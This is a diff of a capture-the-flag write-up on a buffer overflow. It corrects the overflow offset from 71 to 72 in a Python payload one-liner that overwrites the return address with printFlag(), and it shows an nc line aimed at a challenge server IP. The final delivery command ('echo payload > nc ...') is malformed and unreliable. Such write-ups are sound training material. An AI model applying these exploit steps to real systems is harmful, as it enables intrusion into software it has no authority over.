@@ -18,7 +18,7 @@ The challenge name suggests that they should attempt a Buffer Overflow exploit.
    root@mctf:~$ ./bofez
    ```
    Spam "A"s as input until there is a segmentation fault<br />
-   In this challenge, the offset was 71
+   In this challenge, the offset was 72
 2. Finding the flag
    Upon disassembling the binary, the printFlag() function can be seen<br />
    ```console
@@ -32,7 +32,7 @@ The challenge name suggests that they should attempt a Buffer Overflow exploit.
 4. Crafting the payload
    With the offset and memory address of the printFlag() function, craft the payload<br />
    ```console
-   root@mctf:~$ python -c "print 'A' * 71 + '\x92\x11\x40'" > payload
+   root@mctf:~$ python -c "print 'A' * 72 + '\x92\x11\x40'" > payload
    ```
    ```console
    root@mctf:~$ echo payload > nc 128.199.77.173 1342
